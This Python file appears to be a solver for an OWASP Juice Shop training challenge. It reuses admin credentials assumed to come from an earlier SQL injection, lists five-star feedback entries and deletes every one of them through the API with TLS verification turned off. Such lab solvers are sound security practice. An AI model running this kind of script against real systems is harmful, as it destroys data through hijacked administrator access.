"""
This file is used to solve the OWASP Juice-shop Task
DELETE FIVESTAR
METHODOLOGY: login to admin and then delete all the five star
-------------------------------------------------------------
RE: You need to have records of admin first.
If not, please run SQL injection
"""


from plugins import attack as a

class delete_fiveStar():

    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/api/Feedbacks/'
        self.generator()
        self.deleteStar = 5

    def generator(self):
        try:
            new_cookie, new_header = a.get_auth("admin")
            self.cookie, self.header = new_cookie, new_header
        except:
            print("you do not have a record of admin, please try SQL injection first")

    def show_5StarList(self):
        response = self.juice_session.get(self.url,
                                          cookies=self.cookie, headers=self.header, verify=False)
        print(response.text)
        show_List = []
        for i in range(len(response.json()["data"])):
            item = response.json()["data"]
            if item[i]["rating"] == self.deleteStar:
                show_List.append(item[i]["id"])
        print(show_List)
        return show_List

    def delete_allList(self, delete_list):
        for j in range(len(delete_list)):
            print(delete_list[j])
            res = self.juice_session.delete(a.URL + '/api/Feedbacks/{}'.format(str(delete_list[j])),
                                            cookies=self.cookie, headers=self.header, verify=False)
            print(res)

    def run(self):
        print("--------------------------------------------------------------")
        print("Now let us solve the challenge five star deleting ------------")
        delete_list = self.show_5StarList()
        self.delete_allList(delete_list)
        ##check deleting
        fiveStar_list = self.show_5StarList()
        print( len(fiveStar_list)==0 )